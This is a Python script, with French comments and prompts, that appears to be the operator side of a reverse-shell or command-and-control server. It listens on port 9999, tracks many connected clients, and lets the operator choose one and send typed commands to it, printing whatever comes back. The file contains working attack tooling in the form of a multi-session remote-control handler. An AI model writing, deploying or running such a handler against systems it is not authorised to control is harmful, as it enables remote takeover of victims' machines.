import socket
import threading
import signal
import sys

clients = []  # Liste des clients connectés : (id, conn, addr)
client_id_counter = 0
lock = threading.Lock()
server_running = True

def handle_client(client_id, conn, addr):
    print(f"[+] Client {client_id} connecté depuis {addr[0]}:{addr[1]}")

    while server_running:
        try:
            data = conn.recv(4096)
            if not data:
                print(f"[-] Client {client_id} déconnecté.")
                break
            print(f"[client-{client_id}] {data.decode(errors='ignore')}\n")
        except:
            print(f"[!] Erreur avec client {client_id}.")
            break

    conn.close()
    with lock:
        for i, (cid, _, _) in enumerate(clients):
            if cid == client_id:
                clients.pop(i)
                break

def accept_clients(server_socket):
    global client_id_counter, server_running
    while server_running:
        try:
            conn, addr = server_socket.accept()
        except OSError:
            # Socket fermé, on sort proprement
            break
        with lock:
            client_id_counter += 1
            client_id = client_id_counter
            clients.append((client_id, conn, addr))
        threading.Thread(target=handle_client, args=(client_id, conn, addr), daemon=True).start()

def show_clients():
    print("\n=== Clients connectés ===")
    with lock:
        for cid, _, addr in clients:
            print(f"{cid} - {addr[0]}:{addr[1]}")
    print("=========================")

def interact_with_client(client_id, conn):
    print(f"\n[*] Session interactive avec client-{client_id}. Tape 'back' pour revenir au menu.")
    while True:
        command = input(f"[client-{client_id}] >> ")

        if command.strip().lower() == "back":
            print("[*] Retour au menu principal.")
            break
        if not command.strip():
            continue

        try:
            conn.send(command.encode())
        except Exception as e:
            print(f"[!] Erreur lors de l'envoi : {e}")
            break

def signal_handler(sig, frame):
    global server_running
    print("\n[*] Fermeture du serveur, déconnexion des clients...")
    server_running = False
    with lock:
        for _, conn, _ in clients:
            try:
                conn.send("exit".encode())
                conn.close()
            except:
                pass
    sys.exit(0)

def main():
    global server_running

    HOST = '0.0.0.0'
    PORT = 9999

    signal.signal(signal.SIGINT, signal_handler)

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"[*] Serveur en écoute sur {HOST}:{PORT}...")

    accept_thread = threading.Thread(target=accept_clients, args=(server,), daemon=True)
    accept_thread.start()

    while server_running:
        show_clients()
        try:
            target_id = int(input("Sélectionne l'ID du client (ou 0 pour quitter) : "))
            if target_id == 0:
                print("[*] Arrêt demandé.")
                signal_handler(None, None)
                break

            with lock:
                selected = next((c for c in clients if c[0] == target_id), None)

            if not selected:
                print("[!] Client non trouvé.")
                continue

            _, conn, _ = selected
            interact_with_client(target_id, conn)

        except Exception as e:
            print(f"[!] Erreur : {e}")

if __name__ == "__main__":
    main()
